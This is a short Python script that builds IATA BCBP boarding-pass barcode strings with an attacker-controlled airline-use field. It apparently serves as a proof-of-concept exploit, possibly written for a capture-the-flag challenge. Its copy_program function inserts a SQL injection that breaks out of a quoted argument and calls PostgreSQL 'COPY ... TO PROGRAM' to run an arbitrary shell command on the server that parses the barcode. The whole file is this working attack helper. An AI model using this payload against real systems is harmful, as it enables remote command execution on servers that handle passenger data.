#!/usr/bin/env python3
"""Minimal IATA BCBP (format M, one leg) with attacker-controlled airline_use."""

UNIQUE = "0WK    BBA "  # item 10 = 0x0B (11 bytes)
REPEATED = "125"  # item 17 = 0x03 (3 bytes)


def build(airline_use: str, dest: str = "JFK") -> str:
    dest = dest.ljust(3)[:3]
    prefix = (
        "M1"
        + "DOE/JOHN".ljust(20)
        + "E"
        + "ABC123".ljust(7)
        + "LHR"
        + dest
        + "BA".ljust(3)
        + "0123".ljust(5)
        + "001"
        + "Y"
        + "012A"
        + "0001 "
        + "1"
    )
    if len(prefix) != 58:
        raise ValueError(f"mandatory prefix {len(prefix)} != 58")
    extra = (
        ">5"
        + f"{len(UNIQUE):02X}"
        + UNIQUE
        + f"{len(REPEATED):02X}"
        + REPEATED
        + airline_use
    )
    if len(extra) > 255:
        raise ValueError(f"conditional section {len(extra)} > 255")
    return prefix + f"{len(extra):02X}" + extra


def copy_program(cmd: str) -> str:
    """Break out of the quoted airline_use argument and COPY TO PROGRAM."""
    return build(f"x'); COPY (SELECT '') TO PROGRAM '{cmd}'--")
